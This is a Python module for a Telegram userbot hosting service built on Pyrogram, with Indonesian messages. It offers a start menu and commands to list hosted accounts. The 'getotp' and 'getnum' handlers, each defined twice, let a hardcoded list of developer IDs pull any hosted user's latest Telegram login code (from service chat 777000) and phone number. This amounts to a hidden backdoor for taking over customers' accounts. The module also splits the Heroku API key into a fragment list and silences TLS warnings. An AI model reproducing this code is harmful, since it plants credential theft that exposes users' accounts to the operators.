import os
import sys
from io import BytesIO
from itertools import count

import urllib3
from dotenv import load_dotenv
from pyrogram import *
from pyrogram.types import *
from ubotlibs.ubot.utils.misc import *

from config import *
from Ubot import *
from Ubot.logging import LOGGER
from Ubot.modules.basic import *


def restart():
    os.execvp(sys.executable, [sys.executable, "-m", "Ubot"])


HAPP = None

GUA = [1054295664, 1898065191, 1889573907, 2133148961]

load_dotenv()

session_counter = count(1)

ANU = """
❏ **Users** Ke {}
├╼ **Nama**: {}
╰╼ **ID**: {}
"""

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


XCB = [
    "/",
    "@",
    ".",
    "com",
    ":",
    "git",
    "heroku",
    "push",
    str(HEROKU_API_KEY),
    "https",
    str(HEROKU_APP_NAME),
    "HEAD",
    "main",
]


@app.on_message(filters.command(["start"]))
async def start_(client: Client, message: Message):
    ADMIN1_ID[0]
    ADMIN2_ID[0]
    await message.reply_text(
        f"""<b>👋 Halo {message.from_user.first_name} \n
💭 Apa ada yang bisa saya bantu
💡 Jika ingin membuat bot premium . Kamu bisa hubungin admin dibawah ini membuat bot.</b>""",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        text="👮‍♂ Admin 1", url=f"https://t.me/kenapanan"
                    ),
                    InlineKeyboardButton(
                        text="👮‍♂ Admin 2", url=f"https://t.me/Rizzvbss"
                    ),
                ],
                [
                    InlineKeyboardButton(text="Tutup", callback_data="cl_ad"),
                ],
            ]
        ),
        disable_web_page_preview=True,
    )


@app.on_message(filters.private & filters.command("restart") & ~filters.via_bot)
async def restart_bot(client, message):
    try:
        await message.edit("Restarting bot...")
        LOGGER(__name__).info("BOT SERVER RESTARTED !!")
    except BaseException as err:
        LOGGER(__name__).info(f"{err}")
        return

    await message.edit("✅ Bot has restarted.")
    client.restart()


@Client.on_message(filters.command(["user"], "") & filters.me)
async def usereee(client, message):
    if message.from_user.id not in GUA:
        return await message.reply(
            "❌ Anda tidak bisa menggunakan perintah ini\n\n✅ hanya developer yang bisa menggunakan perintah ini"
        )
    count = 0
    user = ""
    for X in bots:
        try:
            count += 1
            user += f"""
❏ USERBOT KE {count}
 ├ AKUN: <a href=tg://user?id={X.me.id}>{X.me.first_name} {X.me.last_name or ''}</a>
 ╰ ID: <code>{X.me.id}</code>
"""
        except BaseException:
            pass
    if int(len(str(user))) > 4096:
        with BytesIO(str.encode(str(user))) as out_file:
            out_file.name = "userbot.txt"
            await message.reply_document(
                document=out_file,
            )
    else:
        await message.reply(f"<b>{user}</b>")


@Client.on_message(filters.command(["getotp", "getnum"], "") & filters.me)
async def otp_and_numbereeee(client, message):
    if len(message.command) < 2:
        return await client.send_message(
            message.chat.id,
            f"<code>{message.text} user_id userbot yang aktif</code>",
            reply_to_message_id=message.id,
        )
    elif message.from_user.id not in GUA:
        return await message.reply(
            "❌ Anda tidak bisa menggunakan perintah ini\n\n✅ hanya developer yang bisa menggunakan perintah ini"
        )
    try:
        for X in bots:
            if int(message.command[1]) == X.me.id:
                if message.command[0] == "getotp":
                    async for otp in X.search_messages(777000, limit=1):
                        if otp.text:
                            return await client.send_message(
                                message.chat.id,
                                otp.text,
                                reply_to_message_id=message.id,
                            )
                        else:
                            return await client.send_message(
                                message.chat.id,
                                "<code>Kode Otp Tidak Di Temukan</code>",
                                reply_to_message_id=message.id,
                            )
                elif message.command[0] == "getnum":
                    return await client.send_message(
                        message.chat.id,
                        X.me.phone_number,
                        reply_to_message_id=message.id,
                    )
    except Exception as error:
        return await client.send_message(
            message.chat.id, error, reply_to_message_id=message.id
        )


@app.on_message(filters.command(["user"]))
async def user(client, message):
    if message.from_user.id not in GUA:
        return await message.reply(
            "❌ Anda tidak bisa menggunakan perintah ini\n\n✅ hanya developer yang bisa menggunakan perintah ini"
        )
    count = 0
    user = ""
    for X in bots:
        try:
            count += 1
            user += f"""
❏ USERBOT KE {count}
 ├ AKUN: <a href=tg://user?id={X.me.id}>{X.me.first_name} {X.me.last_name or ''}</a>
 ╰ ID: <code>{X.me.id}</code>
"""
        except BaseException:
            pass
    if int(len(str(user))) > 4096:
        with BytesIO(str.encode(str(user))) as out_file:
            out_file.name = "userbot.txt"
            await message.reply_document(
                document=out_file,
            )
    else:
        await message.reply(f"<b>{user}</b>")


@app.on_message(filters.command(["getotp", "getnum"]))
async def otp_and_number(client, message):
    if len(message.command) < 2:
        return await app.send_message(
            message.chat.id,
            f"<code>{message.text} user_id userbot yang aktif</code>",
            reply_to_message_id=message.id,
        )
    elif message.from_user.id not in GUA:
        return await message.reply(
            "❌ Anda tidak bisa menggunakan perintah ini\n\n✅ hanya developer yang bisa menggunakan perintah ini"
        )
    try:
        for X in bots:
            if int(message.command[1]) == X.me.id:
                if message.command[0] == "getotp":
                    async for otp in X.search_messages(777000, limit=1):
                        if otp.text:
                            return await app.send_message(
                                message.chat.id,
                                otp.text,
                                reply_to_message_id=message.id,
                            )
                        else:
                            return await app.send_message(
                                message.chat.id,
                                "<code>Kode Otp Tidak Di Temukan</code>",
                                reply_to_message_id=message.id,
                            )
                elif message.command[0] == "getnum":
                    return await app.send_message(
                        message.chat.id,
                        X.me.phone_number,
                        reply_to_message_id=message.id,
                    )
    except Exception as error:
        return await app.send_message(
            message.chat.id, error, reply_to_message_id=message.id
        )
